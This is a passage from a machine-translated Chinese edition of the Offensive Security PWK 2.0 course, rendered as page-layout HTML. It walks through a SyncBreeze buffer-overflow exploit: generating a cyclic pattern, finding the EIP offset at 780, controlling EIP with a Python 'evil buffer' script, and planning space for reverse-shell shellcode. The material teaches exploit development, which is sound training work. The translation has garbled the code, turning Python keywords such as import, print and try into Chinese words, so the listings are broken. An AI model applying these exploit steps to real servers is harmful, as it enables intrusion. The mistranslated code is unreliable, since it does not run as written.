<div style="position:absolute;top:68606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或应用程序的流程。</font><font style="vertical-align: inherit;">然而，此时我们只知道我们的一些未知部分</font></font></nobr></div>
<div style="position:absolute;top:68625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A的缓存覆盖EIP如图213所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68818;left:358"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 213：EIP 被 A 覆盖</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们可以将有效的目标地址加载到指令指针并控制执行之前</font></font></nobr></div>
<div style="position:absolute;top:68869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流，我们需要确切地知道我们的缓冲区的哪一部分登陆 EIP。</font></font></nobr></div>
<div style="position:absolute;top:68902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有两种常见的方法可以做到这一点。</font><font style="vertical-align: inherit;">首先，我们可以尝试</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二叉树分析</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">而不是 800</font></font></nobr></div>
<div style="position:absolute;top:68921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A，我们发送 400 个 A 和 400 个 B。</font><font style="vertical-align: inherit;">如果 EIP 被 B 覆盖，我们知道这四个字节驻留在</font></font></nobr></div>
<div style="position:absolute;top:68940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区的后半部分。</font><font style="vertical-align: inherit;">然后我们将 400 B 更改为 200 B 和 200 C，并发送缓冲区</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:69079;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="59"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 59 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:69112;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:70189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:70189;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:70189;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">379</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次。</font><font style="vertical-align: inherit;">如果 EIP 被 C 覆盖，我们知道这四个字节位于 600-800 字节范围内。</font></font></nobr></div>
<div style="position:absolute;top:69227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们继续拆分特定缓冲区，直到达到覆盖 EIP 的确切四个字节。</font></font></nobr></div>
<div style="position:absolute;top:69246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从数学上讲，这应该在七次迭代中发生。</font></font></nobr></div>
<div style="position:absolute;top:69279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，有一种更快的方法可以识别这四个字节的位置。</font><font style="vertical-align: inherit;">我们可以充分利用</font></font></nobr></div>
<div style="position:absolute;top:69299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由不重复的 4 字节块组成的长字符串作为我们的模糊测试输入。</font><font style="vertical-align: inherit;">然后，当 EIP</font></font></nobr></div>
<div style="position:absolute;top:69318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被我们的字符串中的 4 个字节覆盖，我们可以使用它们唯一的序列来精确定位</font></font></nobr></div>
<div style="position:absolute;top:69337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们在整个输入缓冲区中的位置。</font><font style="vertical-align: inherit;">虽然这可能有点难以理解</font></font></nobr></div>
<div style="position:absolute;top:69357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，当我们应用该技术时，它变得更加清晰。</font></font></nobr></div>
<div style="position:absolute;top:69389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 Metasploit 的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pattern_create.rb</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ruby 脚本来帮助我们采用这种方法。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:69409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pattern_create.rb 脚本位于 /usr/share/metasploit-framework/tools/exploit/ 但它可以是</font></font></nobr></div>
<div style="position:absolute;top:69428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_create</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Kali 中的任何位置运行</font><font style="vertical-align: inherit;">，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定位pattern_create</font></font></font></b></nobr></div>
<div style="position:absolute;top:69480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/msf-pattern_create</font></font></nobr></div>
<div style="position:absolute;top:69497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</font></font></nobr></div>
<div style="position:absolute;top:69531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_create -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:69548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：msf-pattern_create [选项]</font></font></nobr></div>
<div style="position:absolute;top:69565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例：msf-pattern_create -l 50 -s ABC,def,123</font></font></nobr></div>
<div style="position:absolute;top:69582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf</font></font></nobr></div>
<div style="position:absolute;top:69616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:69633;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l, --length &lt;长度&gt;    </font></font></nobr></div>
<div style="position:absolute;top:69633;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图案长度</font></font></nobr></div>
<div style="position:absolute;top:69650;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s, --sets &lt;ABC,def,123&gt;    </font></font></nobr></div>
<div style="position:absolute;top:69650;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自定义模式集</font></font></nobr></div>
<div style="position:absolute;top:69667;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h, --help    </font></font></nobr></div>
<div style="position:absolute;top:69667;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此消息</font></font></nobr></div>
<div style="position:absolute;top:69686;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 346 - msf-pattern_create 的位置和帮助用法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了为我们的概念证明创建字符串，我们传递</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，该参数定义了长度</font></font></nobr></div>
<div style="position:absolute;top:69735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们所需的字符串（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">800</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_create -l 800</font></font></font></b></nobr></div>
<div style="position:absolute;top:69787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac</font></font></nobr></div>
<div style="position:absolute;top:69804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A</font></font></nobr></div>
<div style="position:absolute;top:69821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5</font></font></nobr></div>
<div style="position:absolute;top:69838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak</font></font></nobr></div>
<div style="position:absolute;top:69855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:69874;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 347 - 创建一个唯一的字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一步是更新我们的 Python 脚本，将现有的 800 A 缓冲区替换为这个新的</font></font></nobr></div>
<div style="position:absolute;top:69923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">唯一字符串：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:69975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:70009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:70025;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n发送邪恶的缓冲区..."</font></font></nobr></div>
<div style="position:absolute;top:70059;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"Aa0Aa1Aa2Aa3Aa4Aa5Aa...1Ba2Ba3Ba4Ba5Ba"</font></font></font></b></nobr></div>
<div style="position:absolute;top:70093;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + inputBuffer + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:70110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:70130;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 348 - 使用唯一字符串更新缓冲区 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:70267;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="60"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 60 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:70300;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:71377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:71377;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:71377;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">380</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们重新启动 SyncBreeze 并再次运行我们的漏洞利用时，我们注意到 EIP 包含一个新字符串，</font></font></nobr></div>
<div style="position:absolute;top:70415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似于下面图 214 中所示的那个：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70608;left:382"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 214：EIP 被覆盖</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EIP 寄存器已被</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42306142</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">覆盖</font><font style="vertical-align: inherit;">，这是四个的十六进制表示</font></font></nobr></div>
<div style="position:absolute;top:70659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符“B0aB”。</font><font style="vertical-align: inherit;">知道了这一点，我们可以使用pattern_create.rb的伴侣，命名为</font></font></nobr></div>
<div style="position:absolute;top:70678;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pattern_offset.rb</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，用于确定我们字符串中这四个特定字节的偏移量。</font><font style="vertical-align: inherit;">在 Kali 中，这个脚本</font></font></nobr></div>
<div style="position:absolute;top:70697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_offset</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从任何位置运行</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:70730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要找到 EIP 覆盖发生的偏移量，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定我们的长度</font></font></nobr></div>
<div style="position:absolute;top:70750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始字符串（在我们的例子中是 800）和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-q</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定我们在 EIP 中找到的字节（42306142）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_offset -l 800 -q 42306142</font></font></font></b></nobr></div>
<div style="position:absolute;top:70802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在偏移 780 处完全匹配</font></font></nobr></div>
<div style="position:absolute;top:70821;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 349 - 查找偏移量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_offset 脚本报告这四个字节位于 800 字节的偏移量 780</font></font></nobr></div>
<div style="position:absolute;top:70870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图案。</font><font style="vertical-align: inherit;">让我们把它翻译成一个新的修改过的缓冲区字符串，看看我们是否能得到四个 B</font></font></nobr></div>
<div style="position:absolute;top:70889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(0x42424242) 精确登陆 EIP 寄存器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:70941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:70975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:70992;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n发送邪恶的缓冲区..."</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:71026;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充物 = "A" * 780</font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:71042;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "B" * 4</font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:71059;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 = "C" * 16</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:71094;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer =</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充符 + eip + 缓冲区</font></font></font></b></nobr></div>
<div style="position:absolute;top:71127;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + inputBuffer + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:71144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:71164;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 350 - 更新的缓冲区字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，Web 服务器崩溃了，结果缓冲区结构完美，EIP 现在包含</font></font></nobr></div>
<div style="position:absolute;top:71213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的四个 B (0x42424242) 如图 215 所示： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:71455;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="61"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 61 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:71488;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:72565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:72565;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:72565;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">381</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:71744;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 215：EIP 受控</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在已经完全控制了 EIP，我们应该能够有效地控制执行</font></font></nobr></div>
<div style="position:absolute;top:71794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncBreeze 的流量！</font><font style="vertical-align: inherit;">但是，我们需要替换我们的 0x42424242 占位符并重定向</font></font></nobr></div>
<div style="position:absolute;top:71814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序流向指向我们要执行的代码的有效地址。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:71848;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 编写一个独立的脚本来复制崩溃。</font></font></nobr></div>
<div style="position:absolute;top:71907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 确定输入缓冲区内的偏移量以成功控制 EIP。</font></font></nobr></div>
<div style="position:absolute;top:71935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 更新您的独立脚本以将唯一值放入 EIP 以确保您的偏移量</font></font></nobr></div>
<div style="position:absolute;top:71954;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:71989;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:71989;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们的 Shellcode 定位空间</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至此，我们知道可以在 EIP 中放置任意地址，但是我们不知道什么是真正的</font></font></nobr></div>
<div style="position:absolute;top:72046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用的地址。</font><font style="vertical-align: inherit;">但是，在我们了解可以重定向的位置之前，我们无法选择地址</font></font></nobr></div>
<div style="position:absolute;top:72065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行流程。</font><font style="vertical-align: inherit;">因此，我们将首先关注我们希望目标执行的可执行代码</font></font></nobr></div>
<div style="position:absolute;top:72085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行，更重要的是，了解这段代码在内存中的位置。</font></font></nobr></div>
<div style="position:absolute;top:72117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">理想情况下，我们希望目标执行我们选择的一些代码，如反向 shell。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:72137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括这样的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">317</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为触发崩溃的输入缓冲区的一部分。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:72199;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shellcode 是汇编指令的集合，当执行这些指令时，会执行</font></font></i></nobr></div>
<div style="position:absolute;top:72218;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者想要的动作。</font><font style="vertical-align: inherit;">这通常是打开反向或绑定外壳，但</font></font></i></nobr></div>
<div style="position:absolute;top:72238;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还可能包括更复杂的动作。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 Metasploit 框架来生成我们的 shellcode</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">负载</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">回顾过去</font></font></nobr></div>
<div style="position:absolute;top:72319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在图 215 中我们最后一次崩溃之后注册，我们注意到 ESP 寄存器指向我们的缓冲区</font></font></nobr></div>
<div style="position:absolute;top:72338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CS。</font></font></nobr></div>
<div style="position:absolute;top:72371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们可以在崩溃时通过存储在 ESP 中的地址轻松访问此位置，因此</font></font></nobr></div>
<div style="position:absolute;top:72391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们的 shellcode 来说似乎是一个方便的位置。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:72515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">317 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Shellcode</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:72643;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="62"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 62 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:72676;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:73753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:73753;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:73753;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">382</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在崩溃时仔细检查堆栈（清单 351）会发现我们的前四个 C</font></font></nobr></div>
<div style="position:absolute;top:72791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区降落在地址 0x01307460，ESP 存储 0x01307464（图 215）指向下一个</font></font></nobr></div>
<div style="position:absolute;top:72810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们缓冲区的四个 C：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
